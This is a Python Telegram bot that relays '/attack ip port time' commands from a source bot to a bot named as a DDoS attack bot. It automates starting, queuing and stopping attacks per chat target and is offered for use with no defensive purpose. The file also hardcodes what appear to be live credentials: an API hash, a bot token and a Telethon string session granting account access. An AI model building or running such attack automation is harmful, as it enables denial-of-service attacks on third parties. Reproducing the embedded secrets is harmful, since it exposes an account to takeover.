import asyncio
import re
from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

API_ID = 36295148
API_HASH = "bee66be844e3be0e314508e92a7c4e7d"
BOT_TOKEN = "8473172869:AAG1B8DvV4dwodGudTz11cBed2iq-DDReSY"

BOT_A = "@botbysahilbot"          # IP / CMD source bot
BOT_B = "@DDOS_Aditya_xd_bot"     # Attack bot

STRING_SESSION = (
    "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qUIIMziiQPAG5irsAx37"
    "rfUZra0WJqTRjSox2F7NSUqUi9_bSizm3sfw3Ez5GszsCnrgY7IVixINZgjWQobFkg4JmOePZb14z6XN"
    "O1e1oqNQ_oxugaQN0cBB3IWaH0BaY4G8-O4IfF3GsY_QIbFlLdJeLCxIA6Tah1SHTrTdK4reg_9Vig2sn"
    "pHSri02cNdkoawDBk1QUyo3mL6r4v7uuO0b5w7LpwjCmJnvYUaWOH0uy14seFuaU4gSnQNvvz79sK_p8v"
    "QoZm6h2HLUIOwZLZRugWZ-_iRiaYiU="
)

tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)

# per-chat FSM + target
# state keys: armed, bot_ready, running, current_cmd, pending_cmd, target
chat_state: dict[int, dict] = {}


# --------- HELPERS ----------
async def try_execute(cid: int):
    """Bot READY + pending_cmd + armed + target -> CMD BOT_B ko bhejo."""
    state = chat_state.get(cid)
    if not state:
        return
    if not state["armed"]:
        return
    if not state["bot_ready"]:
        return
    if not state["pending_cmd"]:
        return
    if not state["target"]:
        return

    # yahan cmd already full hai (/attack ip port time),
    # target sirf info ke liye store hai, chaho to logs me use karo
    cmd = state["pending_cmd"]
    state["current_cmd"] = cmd
    state["pending_cmd"] = None
    state["running"] = True
    state["bot_ready"] = False

    print(f"[FSM {cid}] START CMD -> {cmd} | target={state['target']}")
    await tele.send_message(BOT_B, cmd)


async def cancel_task(cid: int):
    """Agar koi CMD RUNNING hai to /stop bhejo."""
    state = chat_state.get(cid)
    if not state or not state["running"]:
        return

    print(f"[FSM {cid}] STOP CMD -> {state['current_cmd']}")
    await tele.send_message(BOT_B, "/stop")

    state["running"] = False
    state["current_cmd"] = None


# --------- TELETHON LISTENERS ----------
@tele.on(events.NewMessage(from_users=BOT_A))
async def ip_bot_listener(event):
    """IP BOT / source se CMD line read + clean karke FSM me daalo."""
    text = event.text or ""
    print("📩 IP BOT REPLY:", text)

    m = re.search(r"CMD:s*(.+)", text)
    if not m:
        return

    cmd = m.group(1).strip()
    cmd = cmd.replace("**", "").replace("`", "").strip()

    print("✅ FINAL CMD:", cmd)

    for cid, state in chat_state.items():
        if not state["armed"]:
            continue
        if not state["target"]:
            # agar target set nahi hai to skip
            continue

        if cmd == state["current_cmd"]:
            print(f"[FSM {cid}] Same CMD running, ignore.")
            continue

        if state["running"]:
            state["pending_cmd"] = cmd
            print(f"[FSM {cid}] New CMD while running -> queue + /stop.")
            await cancel_task(cid)
        else:
            state["pending_cmd"] = cmd
            print(f"[FSM {cid}] Idle -> pending set, try_execute.")
            await try_execute(cid)


@tele.on(events.NewMessage(from_users=BOT_B))
async def bot_b_listener(event):
    """DDOS BOT ke /status ya info se READY detect karo."""
    text = event.text or ""
    low = text.lower()
    print("DDOS BOT MSG:", repr(text))

    is_ready = (
        "✅ **ʀᴇᴀᴅʏ**" in text
        or "no attack running" in low
        or "you can start a new attack" in low
        or "ready" in low
    )

    if not is_ready:
        return

    for cid, state in chat_state.items():
        if not state["armed"]:
            continue

        state["bot_ready"] = True
        await try_execute(cid)


# --------- PTB COMMANDS ----------
async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Per chat target (VC id / group id) set karo."""
    cid = update.effective_chat.id

    if not context.args:
        await update.message.reply_text("Usage: /setlinkchatid <group_link_or_chatid>")
        return

    target = " ".join(context.args).strip()
    state = chat_state.get(cid)
    if not state:
        # agar FSM abhi start nahi hua, basic state bana do
        chat_state[cid] = {
            "armed": False,
            "bot_ready": False,
            "running": False,
            "current_cmd": None,
            "pending_cmd": None,
            "target": target,
        }
    else:
        state["target"] = target

    await update.message.reply_text(f"✅ Target saved: `{target}`", parse_mode="Markdown")


async def start_fsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Event-driven system ON."""
    cid = update.effective_chat.id
    old = chat_state.get(cid)

    chat_state[cid] = {
        "armed": True,
        "bot_ready": False,
        "running": False,
        "current_cmd": None,
        "pending_cmd": None,
        "target": old["target"] if old and "target" in old else None,
    }

    await update.message.reply_text(
        "✅ Event-driven mode ON.
"
        "• /setlinkchatid se target set karo.
"
        "• IP BOT se aane wale CMD: (attack / vote / board) auto handle honge.
"
        "• BOT_B READY pe pending CMD auto start, same CMD ignore, naya pe /stop + start."
    )


async def stop_fsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Event-driven system OFF."""
    cid = update.effective_chat.id

    if cid in chat_state:
        await cancel_task(cid)
        chat_state.pop(cid, None)

    await update.message.reply_text("🛑 Event-driven system stopped & disarmed.")


# --------- MAIN ----------
async def main():
    await tele.start()
    print("🧵 Telethon connected")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("setlinkchatid", setlink))
    app.add_handler(CommandHandler("startfsm", start_fsm))
    app.add_handler(CommandHandler("stopfsm", stop_fsm))

    print("🤖 Control bot running (event-driven + setlinkchatid)")
    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    await tele.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())